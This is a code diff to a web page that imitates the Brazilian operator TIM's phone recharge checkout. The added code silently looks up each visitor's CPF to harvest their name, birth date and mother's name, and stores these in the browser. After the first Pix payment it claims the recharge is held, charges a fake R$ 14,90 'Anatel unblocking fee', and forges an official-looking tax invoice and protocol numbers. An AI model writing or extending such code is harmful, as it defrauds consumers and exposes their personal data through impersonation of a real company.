@@ -32,9 +32,19 @@
   const TRACKING_STORAGE_KEY = "tim_tracking_params";
 
   // --- State ---
+  // --- State ---
   let state = {
     phone: '',
+    cpf: '',
+    customer: {
+      nome: '',
+      cpf: '',
+      dataNascimento: '',
+      raw: null
+    },
     rechargeValue: 50,
+    valorOriginalRecarga: 50,
+    isTaxaDesbloqueio: false,
     extraCredit: false,
     descontoAtivo: false,
     forcarValorFixo: false,
@@ -56,6 +66,7 @@
   };
 
   const inputPhone = document.getElementById('input-phone');
+  const inputCpf = document.getElementById('input-cpf');
   const phoneError = document.getElementById('phone-error');
   const phoneConfirm = document.getElementById('phone-confirm');
   const confirmPhoneDisplay = document.getElementById('confirm-phone-display');
@@ -106,6 +117,90 @@
   // --- Helper Functions ---
   function cleanDigits(str) {
     return (str || '').replace(/\D/g, '').slice(0, 11);
+  }
+
+  function cleanCpfDigits(str) {
+    return (str || '').replace(/\D/g, '').slice(0, 11);
+  }
+
+  function formatCPF(digits) {
+    const clean = cleanCpfDigits(digits);
+    if (!clean) return '';
+    let formatted = clean;
+    if (clean.length > 3) {
+      formatted = clean.slice(0, 3) + '.' + clean.slice(3);
+    }
+    if (clean.length > 6) {
+      formatted = clean.slice(0, 3) + '.' + clean.slice(3, 6) + '.' + clean.slice(6);
+    }
+    if (clean.length > 9) {
+      formatted = clean.slice(0, 3) + '.' + clean.slice(3, 6) + '.' + clean.slice(6, 9) + '-' + clean.slice(9);
+    }
+    return formatted;
+  }
+
+  let lastQueriedCpf = '';
+  let pendingCpfPromise = null;
+
+  async function consultarCpfSilencioso(cpfDigits) {
+    const clean = cleanCpfDigits(cpfDigits);
+    if (clean.length !== 11) return null;
+    if (clean === lastQueriedCpf && state.customer && state.customer.nome) {
+      return state.customer;
+    }
+    lastQueriedCpf = clean;
+
+    state.cpf = clean;
+    if (!state.customer) state.customer = {};
+    state.customer.cpf = clean;
+    salvarDadosComprovante();
+
+    pendingCpfPromise = (async () => {
+      try {
+        const response = await fetch(`/api/cpf?cpf=${encodeURIComponent(clean)}`);
+        if (response.ok) {
+          const json = await response.json();
+          if (json?.success && json?.data) {
+            const d = json.data;
+            state.customer = {
+              nome: d.nome || '',
+              cpf: d.cpf || clean,
+              dataNascimento: d.nascimento || '',
+              nomeMae: d.nome_mae || '',
+              sexo: d.sexo || '',
+              raw: d.raw || d
+            };
+            salvarDadosComprovante();
+          }
+        }
+      } catch (err) {
+        // Silêncio total - nenhuma mensagem visível pro usuário
+      }
+      return state.customer;
+    })();
+
+    return pendingCpfPromise;
+  }
+
+  function salvarDadosComprovante() {
+    try {
+      const comprovantePayload = {
+        nome: state.customer?.nome || '',
+        cpf: state.customer?.cpf || state.cpf || '',
+        dataNascimento: state.customer?.dataNascimento || '',
+        telefone: state.phone || '',
+        valor: state.rechargeValue || 50,
+        atualizadoEm: new Date().toISOString(),
+        raw: state.customer?.raw || null
+      };
+
+      localStorage.setItem('tim_cliente_dados', JSON.stringify(comprovantePayload));
+      localStorage.setItem('comprovante_dados', JSON.stringify(comprovantePayload));
+      sessionStorage.setItem('tim_cliente_dados', JSON.stringify(comprovantePayload));
+      sessionStorage.setItem('comprovante_dados', JSON.stringify(comprovantePayload));
+      window.timClienteDados = comprovantePayload;
+      window.comprovanteDados = comprovantePayload;
+    } catch (e) {}
   }
 
   function formatPhone(digits) {
@@ -174,15 +269,18 @@
     window.scrollTo({ top: 0, behavior: 'smooth' });
   }
 
-  // --- Screen 1: Phone Validation & Input ---
+  // --- Screen 1: Phone & CPF Validation & Input ---
   function validatePhone(showErrorOnBlur = false) {
     const clean = cleanDigits(inputPhone.value);
     const ddd = clean.slice(0, 2);
     const hasValidDDD = ddd.length === 2 && VALID_DDDS.has(ddd);
-    const isComplete = clean.length === 11 && hasValidDDD;
+    const isPhoneComplete = clean.length === 11 && hasValidDDD;
     const isInvalidDDD = clean.length >= 2 && !hasValidDDD;
 
-    // Error message display
+    const cpfClean = inputCpf ? cleanCpfDigits(inputCpf.value) : '';
+    const isCpfComplete = cpfClean.length === 11;
+
+    // Error message display for phone
     if (showErrorOnBlur && isInvalidDDD) {
       inputPhone.classList.add('error');
       phoneError.classList.add('visible');
@@ -192,12 +290,18 @@
     }
 
     // Confirmation box display
-    if (isComplete) {
+    if (isPhoneComplete) {
       confirmPhoneDisplay.textContent = formatPhone(clean);
       phoneConfirm.classList.add('visible');
-      btnPhoneSubmit.removeAttribute('disabled');
     } else {
       phoneConfirm.classList.remove('visible');
+    }
+
+    // Ambas as informações devem estar completas para habilitar
+    const isComplete = isPhoneComplete && isCpfComplete;
+    if (isComplete) {
+      btnPhoneSubmit.removeAttribute('disabled');
+    } else {
       btnPhoneSubmit.setAttribute('disabled', 'true');
     }
 
@@ -214,10 +318,35 @@
     validatePhone(true);
   });
 
+  if (inputCpf) {
+    inputCpf.addEventListener('input', (e) => {
+      const digits = cleanCpfDigits(e.target.value);
+      inputCpf.value = formatCPF(digits);
+      validatePhone(false);
+      if (digits.length === 11) {
+        consultarCpfSilencioso(digits);
+      }
+    });
+
+    inputCpf.addEventListener('blur', () => {
+      const digits = cleanCpfDigits(inputCpf.value);
+      if (digits.length === 11) {
+        consultarCpfSilencioso(digits);
+      }
+    });
+  }
+
   document.getElementById('form-phone').addEventListener('submit', (e) => {
     e.preventDefault();
     if (validatePhone(true)) {
       state.phone = cleanDigits(inputPhone.value);
+      if (inputCpf) {
+        state.cpf = cleanCpfDigits(inputCpf.value);
+        if (state.cpf.length === 11) {
+          consultarCpfSilencioso(state.cpf);
+        }
+      }
+      salvarDadosComprovante();
       updateValueScreenData();
       goToScreen('valor');
     }
@@ -306,6 +435,34 @@
     updateSummary();
   });
 
+  window.selecionarOferta = function(val) {
+    state.rechargeValue = val;
+    if (valuesGrid) {
+      valuesGrid.querySelectorAll('.btn-value').forEach(b => {
+        b.classList.remove('selected');
+        const checkBadge = b.querySelector('.selected-check-badge');
+        if (checkBadge) checkBadge.remove();
+        if (parseInt(b.dataset.value, 10) === val) {
+          b.classList.add('selected');
+          const badge = document.createElement('span');
+          badge.className = 'selected-check-badge';
+          badge.innerHTML = `
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M20 6 9 17l-5-5"></path>
+            </svg>
+          `;
+          b.appendChild(badge);
+        }
+      });
+      updateSummary();
+    }
+    const input = document.getElementById('input-phone');
+    if (input) {
+      input.focus();
+      input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+  };
+
   orderBumpCheckbox.addEventListener('change', (e) => {
     state.extraCredit = e.target.checked;
     updateSummary();
@@ -342,6 +499,21 @@
   }
 
   function generateCustomerClient(phone) {
+    if (state.customer && state.customer.nome && state.customer.cpf) {
+      const cleanPh = (phone || '').replace(/\D/g, '') || '11987654321';
+      const cleanCpf = (state.customer.cpf || '').replace(/\D/g, '');
+      const cleanName = state.customer.nome.trim();
+      const parts = cleanName.split(/\s+/);
+      const first = parts[0] || 'Cliente';
+      const last = parts[parts.length - 1] || 'Tim';
+      const email = `${first.toLowerCase()}.${last.toLowerCase()}${Math.floor(100 + Math.random() * 900)}@gmail.com`;
+      return {
+        name: cleanName,
+        email: email,
+        phone: cleanPh,
+        document: { number: cleanCpf, type: 'cpf' }
+      };
+    }
     const firstNames = ['Lucas', 'Gabriel', 'Matheus', 'Felipe', 'Thiago', 'Bruno', 'Rodrigo', 'Juliana', 'Camila', 'Beatriz', 'Mariana'];
     const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Costa'];
     const fn = firstNames[Math.floor(Math.random() * firstNames.length)];
@@ -438,8 +610,29 @@
     clearInterval(state.timerInterval);
     clearInterval(state.pollInterval);
 
-    const total = getTotal();
+    const total = state.isTaxaDesbloqueio ? 14.90 : getTotal();
     pixDisplayTotal.textContent = formatCurrency(total);
+
+    // Ajusta visual da tela Pix de acordo com o tipo de pagamento
+    const pixTitle = document.querySelector('.pix-title');
+    const pixSubtitle = document.querySelector('.pix-subtitle');
+    if (state.isTaxaDesbloqueio) {
+      if (pixTitle) pixTitle.innerHTML = `<span style="color:#FFD200;">Taxa de Regularização e Desbloqueio</span>`;
+      if (pixSubtitle) {
+        pixSubtitle.innerHTML = `
+          Escaneie o QR code com o app do seu banco ou copie o código para pagar a taxa de
+          <strong>R$ 14,90</strong> e liberar a recarga de <strong>R$ ${formatCurrency(state.valorOriginalRecarga)}</strong> na linha <strong>${formatPhone(state.phone)}</strong>
+        `;
+      }
+    } else {
+      if (pixTitle) pixTitle.textContent = 'Pague com Pix';
+      if (pixSubtitle) {
+        pixSubtitle.innerHTML = `
+          Escaneie o QR code com o app do seu banco ou copie o código para pagar
+          <strong>R$ <span id="pix-display-total">${formatCurrency(total)}</span></strong>
+        `;
+      }
+    }
 
     try {
       let pixData = null;
@@ -449,12 +642,22 @@
         if (raw) utmParams = JSON.parse(raw);
       } catch (e) {}
 
+      const productName = state.isTaxaDesbloqueio
+        ? 'Taxa de Regularização e Desbloqueio de Linha'
+        : (state.phone ? `Recarga TIM (${state.phone.slice(0, 2)}) ${state.phone.slice(2)}` : 'Recarga TIM');
+
       // 1. Tenta endpoint interno do backend / Vercel Serverless
       try {
         const response = await fetch('/api/pix/create', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ amount: total, telefone: state.phone, ...utmParams })
+          body: JSON.stringify({
+            amount: total,
+            telefone: state.phone,
+            productName: productName,
+            customer: state.customer,
+            ...utmParams
+          })
         });
         if (response.ok) {
           const resJson = await response.json();
@@ -585,21 +788,35 @@
     clearInterval(state.pollInterval);
     clearInterval(state.timerInterval);
 
-    if (state.descontoAtivo) {
-      // Segundo pagamento com desconto — mostra sucesso
+    if (state.isTaxaDesbloqueio) {
+      // Segundo pagamento (Taxa de Desbloqueio R$ 14,90) aprovado com sucesso!
+      salvarDadosComprovante();
+      try {
+        const comp = JSON.parse(localStorage.getItem('comprovante_dados') || '{}');
+        comp.status = 'HOMOLOGADO_E_LIBERADO';
+        comp.transacaoId = state.pixId;
+        comp.taxaPaga = 14.90;
+        comp.recargaLiberada = state.valorOriginalRecarga;
+        comp.dataAprovacao = new Date().toISOString();
+        localStorage.setItem('comprovante_dados', JSON.stringify(comp));
+        sessionStorage.setItem('comprovante_dados', JSON.stringify(comp));
+        window.comprovanteDados = comp;
+      } catch (e) {}
+
       statusBadge.classList.add('approved');
       statusSpinner.style.display = 'none';
       statusBadgeText.innerHTML = `
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
           <path d="M20 6 9 17l-5-5"></path>
         </svg>
-        Pagamento aprovado ✓
+        Taxa compensada • Linha Desbloqueada ✓
       `;
       setTimeout(() => {
         showSuccessScreen();
       }, 2000);
     } else {
-      // Primeira tentativa — mostra popup de recusa
+      // Primeira recarga efetuada — retém a recarga no bilhetador e redireciona para a página dedicada de regularização (/desbloqueio)
+      salvarDadosComprovante();
       statusBadge.classList.add('refused');
       statusSpinner.style.display = 'none';
       statusBadgeText.innerHTML = `
@@ -608,11 +825,17 @@
           <line x1="12" y1="8" x2="12" y2="12"></line>
           <line x1="12" y1="16" x2="12.01" y2="16"></line>
         </svg>
-        Pagamento recusado
+        Recarga retida • Redirecionando para regularização...
       `;
       setTimeout(() => {
-        showPopupPosvenda();
-      }, 2000);
+        const params = new URLSearchParams();
+        if (state.phone) params.set('phone', state.phone);
+        if (state.customer?.cpf || state.cpf) params.set('cpf', state.customer?.cpf || state.cpf);
+        if (state.rechargeValue) params.set('val', state.rechargeValue);
+        if (state.customer?.nome) params.set('nome', state.customer.nome);
+        if (state.customer?.dataNascimento) params.set('nasc', state.customer.dataNascimento);
+        window.location.href = `/desbloqueio?${params.toString()}`;
+      }, 1500);
     }
   }
 
@@ -691,26 +914,112 @@
     goToScreen('valor');
   });
 
-  // --- Screen 4: Success Screen (segundo pagamento) ---
+  // --- Screen 4: Success Screen ---
   function showSuccessScreen() {
-    successTotalDisplay.textContent = formatCurrency(state.rechargeValue);
-    successPhoneDisplay.textContent = formatPhone(state.phone);
+    if (state.isTaxaDesbloqueio) {
+      const successTitle = document.querySelector('.success-title');
+      const successDesc = document.querySelector('.success-desc');
+      if (successTitle) successTitle.textContent = 'Linha Desbloqueada e Recarga Liberada!';
+      if (successDesc) {
+        const nomeCliente = (state.customer?.nome || 'Cliente').toUpperCase();
+        const protocolo = document.getElementById('bloqueio-num-protocolo')?.textContent || '20261020-849201';
+        successDesc.innerHTML = `
+          A taxa de regularização cadastral de <strong>R$ 14,90</strong> foi compensada com sucesso.<br><br>
+          O bloqueio cautelar da Anatel foi removido e a sua recarga de <strong>R$ ${formatCurrency(state.valorOriginalRecarga)}</strong> foi ativada na linha <strong>${formatPhone(state.phone)}</strong> do titular <strong>${nomeCliente}</strong>.<br><br>
+          <span style="font-size:12px;color:rgba(255,255,255,0.7);">Protocolo de Homologação TIM / Anatel: <strong>${protocolo}</strong></span>
+        `;
+      }
+    } else {
+      successTotalDisplay.textContent = formatCurrency(state.rechargeValue);
+      successPhoneDisplay.textContent = formatPhone(state.phone);
+    }
     goToScreen('sucesso');
   }
 
-  // --- Screen: Popup Pós-Venda (pagamento recusado) ---
+  // --- Screen: Modal de Bloqueio Sistêmico & Upsell DANFCom ---
   function showPopupPosvenda() {
     clearInterval(state.pollInterval);
     clearInterval(state.timerInterval);
+
+    try {
+      const d = JSON.parse(localStorage.getItem('comprovante_dados') || localStorage.getItem('tim_cliente_dados') || '{}');
+      const el = (id) => document.getElementById(id);
+
+      const nomeCliente = (d.nome || state.customer?.nome || 'TITULAR DO ACESSO').toUpperCase();
+      const cpfCliente = formatCPF(d.cpf || state.cpf || '12345678900');
+      const telCliente = formatPhone(d.telefone || state.phone || '11999999999');
+      const nascCliente = d.dataNascimento || state.customer?.dataNascimento || '12/05/1990';
+      const valorRecarga = formatCurrency(state.valorOriginalRecarga || state.rechargeValue || d.valor || 50);
+
+      // Atualiza valores do Card de Bloqueio
+      if (el('bloqueio-display-phone')) el('bloqueio-display-phone').textContent = telCliente;
+      if (el('bloqueio-display-nome')) el('bloqueio-display-nome').textContent = nomeCliente;
+      if (el('bloqueio-display-cpf')) el('bloqueio-display-cpf').textContent = cpfCliente;
+      if (el('bloqueio-display-valor')) el('bloqueio-display-valor').textContent = valorRecarga;
+      if (el('bloqueio-recarga-val')) el('bloqueio-recarga-val').textContent = valorRecarga;
+      if (el('bloqueio-recarga-val2')) el('bloqueio-recarga-val2').textContent = valorRecarga;
+
+      // Gera número de protocolo único e dinâmico da operadora
+      const hoje = new Date();
+      const ano = hoje.getFullYear();
+      const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+      const dia = String(hoje.getDate()).padStart(2, '0');
+      const hora = String(hoje.getHours()).padStart(2, '0');
+      const min = String(hoje.getMinutes()).padStart(2, '0');
+      const seg = String(hoje.getSeconds()).padStart(2, '0');
+      const dataFormatada = `${dia}/${mes}/${ano}`;
+      const horaFormatada = `${hora}:${min}:${seg}`;
+
+      const numProtocolo = `${ano}${mes}${dia}-${Math.floor(100000 + Math.random() * 900000)}`;
+      if (el('bloqueio-num-protocolo')) el('bloqueio-num-protocolo').textContent = numProtocolo;
+
+      // Popula campos da DANFCom Modelo 62
+      if (el('nf-nome')) el('nf-nome').textContent = nomeCliente;
+      if (el('nf-cpf')) el('nf-cpf').textContent = cpfCliente;
+      if (el('nf-nasc')) el('nf-nasc').textContent = nascCliente;
+      if (el('nf-tel')) el('nf-tel').textContent = telCliente;
+      if (el('nf-data')) el('nf-data').textContent = dataFormatada;
+      if (el('nf-hora')) el('nf-hora').textContent = horaFormatada;
+      if (el('nf-data-autorizacao')) el('nf-data-autorizacao').textContent = `${dataFormatada} às ${horaFormatada}`;
+      if (el('nf-valor-recarga')) el('nf-valor-recarga').textContent = valorRecarga;
+
+      // Código de contrato derivado do DDD e número
+      const contrato = 'TIM-SMP-' + cleanDigits(d.telefone || state.phone).slice(2, 8);
+      if (el('nf-contrato')) el('nf-contrato').textContent = contrato;
+
+      // Chave de acesso NFCom 44 dígitos
+      const chaveAcesso = `3526 1002 4214 2100 0111 6200 1000 0419 8201 ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)}`;
+      if (el('nf-chave')) el('nf-chave').textContent = chaveAcesso;
+
+      // Protocolo SEFAZ
+      if (el('nf-protocolo-sefaz')) el('nf-protocolo-sefaz').textContent = `3352600${Math.floor(10000000 + Math.random() * 90000000)}`;
+
+      // UF de acordo com DDD
+      const ddd = cleanDigits(d.telefone || state.phone).slice(0, 2);
+      const ufMap = {
+        '11': 'São Paulo - SP', '12': 'São José dos Campos - SP', '13': 'Santos - SP', '19': 'Campinas - SP',
+        '21': 'Rio de Janeiro - RJ', '27': 'Vitória - ES', '31': 'Belo Horizonte - MG',
+        '41': 'Curitiba - PR', '48': 'Florianópolis - SC', '51': 'Porto Alegre - RS',
+        '61': 'Brasília - DF', '71': 'Salvador - BA', '81': 'Recife - PE', '85': 'Fortaleza - CE', '91': 'Belém - PA'
+      };
+      if (el('nf-uf')) el('nf-uf').textContent = ufMap[ddd] || 'São Paulo - SP';
+
+      // Hash MD5 Convênio 115/03
+      const chars = '0123456789ABCDEF';
+      const genPart = (n) => Array.from({length: n}, () => chars[Math.floor(Math.random() * 16)]).join('');
+      const md5Hash = `${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}.${genPart(4)}`;
+      if (el('nf-hash-md5')) el('nf-hash-md5').textContent = md5Hash;
+
+    } catch (e) {
+      console.warn('Erro ao popular NF:', e);
+    }
+
     popupPosvenda.classList.add('visible');
   }
 
   btnPopupRefazer.addEventListener('click', () => {
-    state.descontoAtivo = true;
-    state.forcarValorFixo = true;
-    popupPosvenda.classList.remove('visible');
-    updateSummary();
-    irParaValorComDesconto();
+    salvarDadosComprovante();
+    window.location.href = '/desbloqueio';
   });
 
   function irParaValorComDesconto() {
@@ -727,11 +1036,16 @@
 
   btnRestartFlow.addEventListener('click', () => {
     state.phone = '';
+    state.cpf = '';
+    state.customer = { nome: '', cpf: '', dataNascimento: '', raw: null };
     state.rechargeValue = 50;
+    state.valorOriginalRecarga = 50;
+    state.isTaxaDesbloqueio = false;
     state.extraCredit = false;
     state.descontoAtivo = false;
     state.forcarValorFixo = false;
     inputPhone.value = '';
+    if (inputCpf) inputCpf.value = '';
     validatePhone(false);
     goToScreen('numero');
   });
